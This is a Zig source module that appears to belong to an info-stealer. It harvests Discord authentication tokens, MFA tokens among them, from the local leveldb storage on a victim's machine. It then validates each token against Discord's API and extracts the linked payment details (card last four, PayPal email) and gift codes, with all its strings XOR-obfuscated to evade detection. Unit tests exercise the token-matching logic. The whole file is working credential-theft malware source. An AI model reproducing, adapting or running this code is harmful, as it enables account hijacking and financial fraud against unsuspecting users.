const std = @import("std");
const file_io = @import("../parsers/file_io.zig");
const hash = @import("../types/hash.zig");
const http = @import("../network/http.zig");

pub const DiscordAccount = struct {
    token: []const u8,
    has_billing: bool,
    billing_summary: []const u8,
    gift_codes: []const u8,

    pub fn deinit(self: *DiscordAccount, allocator: std.mem.Allocator) void {
        allocator.free(self.token);
        allocator.free(self.billing_summary);
        allocator.free(self.gift_codes);
    }
};

const E = struct {
    pub const auth_header = hash.xorEncrypt("Authorization");
    pub const bearer_prefix = hash.xorEncrypt("Bearer ");
    pub const api_host = hash.xorEncrypt("discord.com");
    pub const billing_path = hash.xorEncrypt("/api/v9/users/@me/billing/payment-sources");
    pub const gifts_path = hash.xorEncrypt("/api/v9/users/@me/outbound-promotions/codes");
    pub const validate_path = hash.xorEncrypt("/api/v9/users/@me");
    pub const type_key = hash.xorEncrypt("type");
    pub const last4_key = hash.xorEncrypt("last_4");
    pub const email_key = hash.xorEncrypt("email");
    pub const code_key = hash.xorEncrypt("code");
    pub const ot_key = hash.xorEncrypt("outbound_title");
    pub const card_type = hash.xorEncrypt("Card");
    pub const paypal_type = hash.xorEncrypt("PayPal");
    pub const empty = hash.xorEncrypt("");
};

fn isTokenChar(c: u8) bool {
    return switch (c) {
        'A'...'Z', 'a'...'z', '0'...'9', '_', '-' => true,
        else => false,
    };
}

fn scanLeveldbFiles(allocator: std.mem.Allocator, leveldb_path: []const u8, seen: *std.StringHashMap(void)) !void {
    var dir = std.fs.openDirAbsolute(leveldb_path, .{ .iterate = true }) catch return;
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch return) |entry| {
        if (entry.kind != .file) continue;
        const name = entry.name;
        if (name.len < 4) continue;
        const ext = name[name.len - 4 ..];
        if (!std.mem.eql(u8, ext, ".ldb") and !std.mem.eql(u8, ext, ".log")) continue;

        const full_path = try std.fs.path.join(allocator, &[_][]const u8{ leveldb_path, name });
        defer allocator.free(full_path);

        const mapped = file_io.MappedFile.open(full_path) orelse continue;
        defer mapped.close();

        const data = mapped.slice();
        extractTokens(data, seen) catch {};
    }
}

fn extractTokens(data: []const u8, seen: *std.StringHashMap(void)) !void {
    var i: usize = 0;
    while (i < data.len) {
        if (i + 4 <= data.len and data[i] == 'm' and data[i + 1] == 'f' and data[i + 2] == 'a' and data[i + 3] == '.') {
            const start = i;
            var end = i + 4;
            while (end < data.len and isTokenChar(data[end])) : (end += 1) {}
            const token_len = end - start;
            if (token_len >= 84 and token_len <= 99) {
                const token = try seen.allocator.dupe(u8, data[start..end]);
                const gop = try seen.getOrPut(token);
                if (gop.found_existing) {
                    seen.allocator.free(token);
                } else {
                    gop.key_ptr.* = token;
                }
            }
            i = end;
            continue;
        }

        if (!isTokenChar(data[i])) {
            i += 1;
            continue;
        }

        var seg1_end = i;
        while (seg1_end < data.len and isTokenChar(data[seg1_end])) : (seg1_end += 1) {}
        const seg1_len = seg1_end - i;

        if (seg1_len == 24 and seg1_end < data.len and data[seg1_end] == '.') {
            const dot1 = seg1_end;
            var seg2_end = dot1 + 1;
            while (seg2_end < data.len and isTokenChar(data[seg2_end])) : (seg2_end += 1) {}
            const seg2_len = seg2_end - (dot1 + 1);

            if (seg2_len == 6 and seg2_end < data.len and data[seg2_end] == '.') {
                const dot2 = seg2_end;
                var seg3_end = dot2 + 1;
                while (seg3_end < data.len and isTokenChar(data[seg3_end])) : (seg3_end += 1) {}
                const seg3_len = seg3_end - (dot2 + 1);

                if (seg3_len >= 25 and seg3_len <= 110) {
                    const token = try seen.allocator.dupe(u8, data[i..seg3_end]);
                    const gop = try seen.getOrPut(token);
                    if (gop.found_existing) {
                        seen.allocator.free(token);
                    } else {
                        gop.key_ptr.* = token;
                    }
                }
                i = seg3_end;
                continue;
            }
            i = seg2_end;
            continue;
        }
        i = seg1_end;
    }
}

fn findJsonValue(buf: []const u8, key: []const u8) ?[]const u8 {
    var search_buf: [128]u8 = undefined;
    const search = std.fmt.bufPrint(&search_buf, "\"{s}\":\"", .{key}) catch return null;
    const pos = std.mem.indexOf(u8, buf, search) orelse return null;
    const start = pos + search.len;
    var end = start;
    while (end < buf.len and buf[end] != '"') : (end += 1) {
        if (buf[end] == '\\') end += 1;
    }
    if (end >= buf.len or end == start) return null;
    return buf[start..end];
}

fn scanGiftCodes(body: []const u8, allocator: std.mem.Allocator) ![]const u8 {
    var codes = std.ArrayList(u8).init(allocator);
    errdefer codes.deinit();

    var code_buf: [E.code_key.len]u8 = undefined;
    hash.xorDecrypt(&E.code_key, &code_buf);
    var ot_buf: [E.ot_key.len]u8 = undefined;
    hash.xorDecrypt(&E.ot_key, &ot_buf);

    var search_pos: usize = 0;
    while (std.mem.indexOf(u8, body[search_pos..], &code_buf)) |match| {
        const pos = search_pos + match;
        const after_key = pos + code_buf.len;
        if (after_key + 3 >= body.len) break;
        const quote_start = after_key + 1;
        if (body[after_key] != '"' or quote_start >= body.len) {
            search_pos = pos + 1;
            continue;
        }
        var val_end = quote_start;
        while (val_end < body.len and body[val_end] != '"') : (val_end += 1) {
            if (body[val_end] == '\\') val_end += 1;
        }
        if (val_end <= quote_start) {
            search_pos = pos + 1;
            continue;
        }
        const code_val = body[quote_start..val_end];

        const title_start = val_end + 1;
        if (title_start >= body.len) break;
        const title_search = std.mem.indexOf(u8, body[title_start .. title_start + @min(@as(usize, 200), body.len - title_start)], &ot_buf);
        var title_val: []const u8 = "";
        if (title_search) |ts| {
            const tpos = title_start + ts;
            const tafter = tpos + ot_buf.len;
            if (tafter + 3 < body.len and body[tafter] == '"') {
                const tq = tafter + 1;
                var te = tq;
                while (te < body.len and body[te] != '"') : (te += 1) {}
                if (te > tq) title_val = body[tq..te];
            }
        }

        if (codes.items.len > 0) try codes.appendSlice(", ");
        if (title_val.len > 0) {
            try codes.appendSlice(title_val);
            try codes.appendSlice(": ");
        }
        try codes.appendSlice(code_val);

        search_pos = pos + 1;
    }

    if (codes.items.len == 0) return allocator.dupe(u8, "");
    return try codes.toOwnedSlice();
}

fn scanBilling(body: []const u8, allocator: std.mem.Allocator) !struct { has_billing: bool, summary: []const u8 } {
    var parts = std.ArrayList(u8).init(allocator);
    errdefer parts.deinit();

    var type_key_buf: [E.type_key.len]u8 = undefined;
    hash.xorDecrypt(&E.type_key, &type_key_buf);
    var last4_buf: [E.last4_key.len]u8 = undefined;
    hash.xorDecrypt(&E.last4_key, &last4_buf);
    var email_buf: [E.email_key.len]u8 = undefined;
    hash.xorDecrypt(&E.email_key, &email_buf);
    var card_buf: [E.card_type.len]u8 = undefined;
    hash.xorDecrypt(&E.card_type, &card_buf);
    var pp_buf: [E.paypal_type.len]u8 = undefined;
    hash.xorDecrypt(&E.paypal_type, &pp_buf);

    var search_pos: usize = 0;
    while (std.mem.indexOf(u8, body[search_pos..], &type_key_buf)) |match| {
        const type_pos = search_pos + match;
        const after = type_pos + type_key_buf.len;
        if (after + 2 >= body.len) break;
        var val_start = after;
        while (val_start < body.len and (body[val_start] == ':' or body[val_start] == ' ')) : (val_start += 1) {}
        if (val_start >= body.len) break;
        const type_val = body[val_start];
        if (type_val != '1' and type_val != '2') {
            search_pos = type_pos + 1;
            continue;
        }

        if (parts.items.len > 0) try parts.appendSlice(" | ");

        if (type_val == '1') {
            try parts.appendSlice(&card_buf);
            const segment = body[type_pos..@min(type_pos + 300, body.len)];
            if (findJsonValue(segment, &last4_buf)) |last4| {
                try parts.appendSlice(": *");
                try parts.appendSlice(last4);
            }
        } else {
            try parts.appendSlice(&pp_buf);
            const segment = body[type_pos..@min(type_pos + 300, body.len)];
            if (findJsonValue(segment, &email_buf)) |email| {
                try parts.appendSlice(": ");
                try parts.appendSlice(email);
            }
        }
        search_pos = type_pos + 1;
    }

    if (parts.items.len == 0) return .{ .has_billing = false, .summary = try allocator.dupe(u8, "") };
    return .{ .has_billing = true, .summary = try parts.toOwnedSlice() };
}

fn discordGet(path_enc: []const u8, token: []const u8, allocator: std.mem.Allocator) !http.Response {
    var host_buf: [E.api_host.len]u8 = undefined;
    hash.xorDecrypt(&E.api_host, &host_buf);

    var client = try http.HttpClient.connect(&host_buf, 443);
    errdefer client.close();

    var path_buf: [path_enc.len]u8 = undefined;
    hash.xorDecrypt(path_enc, &path_buf);

    var auth_buf: [E.auth_header.len]u8 = undefined;
    hash.xorDecrypt(&E.auth_header, &auth_buf);
    var bearer_buf: [E.bearer_prefix.len]u8 = undefined;
    hash.xorDecrypt(&E.bearer_prefix, &bearer_buf);

    const auth_value = try std.mem.concat(allocator, u8, &[_][]const u8{ &bearer_buf, token });
    defer allocator.free(auth_value);

    const resp = client.get(&path_buf, &[_]http.Header{.{
        .name = &auth_buf,
        .value = auth_value,
    }}) catch |e| {
        client.close();
        return e;
    };
    client.close();
    return resp;
}

fn enrichToken(allocator: std.mem.Allocator, token: []const u8) ?DiscordAccount {
    var validate_path_buf: [E.validate_path.len]u8 = undefined;
    hash.xorDecrypt(&E.validate_path, &validate_path_buf);

    var validate_resp = discordGet(&E.validate_path, token, allocator) catch return null;
    defer validate_resp.deinit();
    if (validate_resp.status != 200) return null;

    var billing_path_buf: [E.billing_path.len]u8 = undefined;
    hash.xorDecrypt(&E.billing_path, &billing_path_buf);

    const billing_result = blk: {
        var billing_resp = discordGet(&E.billing_path, token, allocator) catch break :blk .{ .has_billing = false, .summary = try allocator.dupe(u8, "") };
        defer billing_resp.deinit();
        break :blk scanBilling(billing_resp.body, allocator) catch .{ .has_billing = false, .summary = try allocator.dupe(u8, "") };
    };

    var gifts_path_buf: [E.gifts_path.len]u8 = undefined;
    hash.xorDecrypt(&E.gifts_path, &gifts_path_buf);

    const gift_codes = blk: {
        var gifts_resp = discordGet(&E.gifts_path, token, allocator) catch break :blk try allocator.dupe(u8, "");
        defer gifts_resp.deinit();
        break :blk scanGiftCodes(gifts_resp.body, allocator) catch try allocator.dupe(u8, "");
    };

    return DiscordAccount{
        .token = try allocator.dupe(u8, token),
        .has_billing = billing_result.has_billing,
        .billing_summary = billing_result.summary,
        .gift_codes = gift_codes,
    };
}

pub fn collect(allocator: std.mem.Allocator, app_data: []const u8) ![]DiscordAccount {
    const leveldb_path = try std.fs.path.join(allocator, &[_][]const u8{ app_data, "Local Storage", "leveldb" });
    defer allocator.free(leveldb_path);

    var seen = std.StringHashMap(void).init(allocator);
    defer seen.deinit();
    try scanLeveldbFiles(allocator, leveldb_path, &seen);

    var accounts = std.ArrayList(DiscordAccount).init(allocator);
    errdefer {
        for (accounts.items) |*a| a.deinit(allocator);
        accounts.deinit();
    }

    var it = seen.iterator();
    while (it.next()) |entry| {
        if (enrichToken(allocator, entry.key_ptr.*)) |acct| {
            try accounts.append(acct);
        }
    }

    return try accounts.toOwnedSlice();
}

test "collect returns empty for nonexistent path" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__discord");
    defer {
        for (result) |*a| a.deinit(std.testing.allocator);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "extractTokens parses standard Discord token" {
    const data = " prefix NDIxMjMyMTIzMTIzMTIzMTIx.My6dZg.sOmE3KbCezM_PlQWW1_BfA0dy9LvP9exe6G-Tg0 suffix ";
    var seen = std.StringHashMap(void).init(std.testing.allocator);
    defer {
        var it = seen.keyIterator();
        while (it.next()) |k| std.testing.allocator.free(k.*);
        seen.deinit();
    }
    try extractTokens(data, &seen);
    try std.testing.expectEqual(@as(usize, 1), seen.count());
}

test "extractTokens parses MFA token" {
    const data = " prefix mfa.kVjF2pHn8mLq3wRs5tXb7zDc9AgE1yUf4iWo0pB6dChJMvNxYSZQaTlrGuIeOPsH suffix ";
    var seen = std.StringHashMap(void).init(std.testing.allocator);
    defer {
        var it = seen.keyIterator();
        while (it.next()) |k| std.testing.allocator.free(k.*);
        seen.deinit();
    }
    try extractTokens(data, &seen);
    try std.testing.expectEqual(@as(usize, 1), seen.count());
}

test "extractTokens handles multiple unique tokens" {
    const data = "NDIxMjMyMTIzMTIzMTIzMTIx.My6dZg.sOmE3KbCezM_PlQWW1_BfA0dy9LvP9exe6G-Tg0 other NzI4NDk1NjQzMjE4NzY1NDMyMQ.AdB9xL.h9KdN8mQwL4pR2sT6vXyZ1cF3gH5jU7kI0oP2bV4nW6mC suffix ";
    var seen = std.StringHashMap(void).init(std.testing.allocator);
    defer {
        var it = seen.keyIterator();
        while (it.next()) |k| std.testing.allocator.free(k.*);
        seen.deinit();
    }
    try extractTokens(data, &seen);
    try std.testing.expectEqual(@as(usize, 2), seen.count());
}

test "extractTokens deduplicates" {
    const data = "NDIxMjMyMTIzMTIzMTIzMTIx.My6dZg.sOmE3KbCezM_PlQWW1_BfA0dy9LvP9exe6G-Tg0 NDIxMjMyMTIzMTIzMTIzMTIx.My6dZg.sOmE3KbCezM_PlQWW1_BfA0dy9LvP9exe6G-Tg0";
    var seen = std.StringHashMap(void).init(std.testing.allocator);
    defer {
        var it = seen.keyIterator();
        while (it.next()) |k| std.testing.allocator.free(k.*);
        seen.deinit();
    }
    try extractTokens(data, &seen);
    try std.testing.expectEqual(@as(usize, 1), seen.count());
}

test "extractTokens skips invalid patterns" {
    const data = "short.abc.def not-a-valid-token no.dots.here either";
    var seen = std.StringHashMap(void).init(std.testing.allocator);
    defer {
        var it = seen.keyIterator();
        while (it.next()) |k| std.testing.allocator.free(k.*);
        seen.deinit();
    }
    try extractTokens(data, &seen);
    try std.testing.expectEqual(@as(usize, 0), seen.count());
}

test "isTokenChar validation" {
    try std.testing.expect(isTokenChar('A'));
    try std.testing.expect(isTokenChar('z'));
    try std.testing.expect(isTokenChar('0'));
    try std.testing.expect(isTokenChar('_'));
    try std.testing.expect(isTokenChar('-'));
    try std.testing.expect(!isTokenChar('.'));
    try std.testing.expect(!isTokenChar('!'));
    try std.testing.expect(!isTokenChar(' '));
}

test "DiscordAccount default values" {
    const acct = DiscordAccount{
        .token = "test",
        .has_billing = false,
        .billing_summary = "",
        .gift_codes = "",
    };
    try std.testing.expectEqualStrings("test", acct.token);
    try std.testing.expect(!acct.has_billing);
    try std.testing.expectEqual(@as(usize, 0), acct.billing_summary.len);
    try std.testing.expectEqual(@as(usize, 0), acct.gift_codes.len);
}

test "findJsonValue extracts quoted string" {
    const json = "{\"key\":\"value123\"}";
    try std.testing.expectEqualStrings("value123", findJsonValue(json, "key").?);
}

test "findJsonValue returns null for missing key" {
    const json = "{\"other\":\"val\"}";
    try std.testing.expect(findJsonValue(json, "missing") == null);
}

test "scanBilling parses card billing" {
    var type_buf: [E.type_key.len]u8 = undefined;
    hash.xorDecrypt(&E.type_key, &type_buf);
    var last4_buf: [E.last4_key.len]u8 = undefined;
    hash.xorDecrypt(&E.last4_key, &last4_buf);

    const json = try std.fmt.allocPrint(std.testing.allocator, "[{{\"{s}\":1,\"{s}\":\"1234\"}}]", .{ &type_buf, &last4_buf });
    defer std.testing.allocator.free(json);

    const result = try scanBilling(json, std.testing.allocator);
    defer std.testing.allocator.free(result.summary);
    try std.testing.expect(result.has_billing);
    try std.testing.expect(result.summary.len > 0);
}

test "scanBilling empty on no type" {
    const json = "[]";
    const result = try scanBilling(json, std.testing.allocator);
    defer std.testing.allocator.free(result.summary);
    try std.testing.expect(!result.has_billing);
}

test "scanGiftCodes empty on no codes" {
    const json = "[]";
    const result = try scanGiftCodes(json, std.testing.allocator);
    defer std.testing.allocator.free(result);
    try std.testing.expectEqual(@as(usize, 0), result.len);
}
